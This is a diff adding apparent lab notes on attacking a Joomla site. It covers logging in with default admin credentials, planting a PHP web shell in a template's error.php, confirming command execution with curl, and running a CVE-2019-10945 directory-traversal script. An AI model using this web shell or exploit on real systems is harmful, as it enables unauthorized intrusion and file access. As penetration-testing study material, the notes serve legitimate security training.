@@ -518,3 +518,84 @@ admin:admin
 
 ---
 
+# Attacking Joomla
+
+## Objective
+Gain access to the internal environment of a Joomla-based e-commerce site to perform enumeration or post-exploitation activities.
+
+## 🎯 Abusing Built-In Functionality
+
+### 1. Admin Panel Login
+- Target: `http://dev.inlanefreight.local/administrator`
+- Credentials: `admin:admin`
+
+### 2. Fixing Login Error
+If you encounter:
+
+"An error has occurred. Call to a member function format() on null"
+
+- Navigate to: `http://dev.inlanefreight.local/administrator/index.php?option=com_plugins`
+- Disable: `Quick Icon - PHP Version Check` plugin
+
+### 3. Template-Based RCE
+- Go to: **Templates** → Select `protostar` → Edit `error.php`
+- Insert PHP Web Shell:
+  ```php
+  <?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>
+
+* Save & Close
+
+### 4. Confirm Execution
+
+```bash
+curl -s "http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id"
+```
+
+Expected Output:
+
+```
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+### 🔐 Best Practices
+
+* Use non-obvious filenames/parameters
+* Limit access (e.g., by IP or password)
+* Clean up the shell after use
+* Document: file name, hash, and location for reporting
+
+## 🧨 Leveraging Known Vulnerabilities
+
+### CVE-2019-10945
+
+* **Type**: Directory Traversal & Authenticated File Deletion
+* **Affected**: Joomla 1.5.0 – 3.9.4
+* **Target Version**: Joomla 3.9.4
+
+### Usage
+
+Use the exploit script:
+
+```bash
+python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
+```
+
+### Outcome
+
+Lists webroot directories:
+
+```
+administrator
+components
+images
+includes
+modules
+templates
+...
+configuration.php
+index.php
+```
+
+> This vulnerability can be used to read or delete sensitive files if accessible via the browser.
+
+---
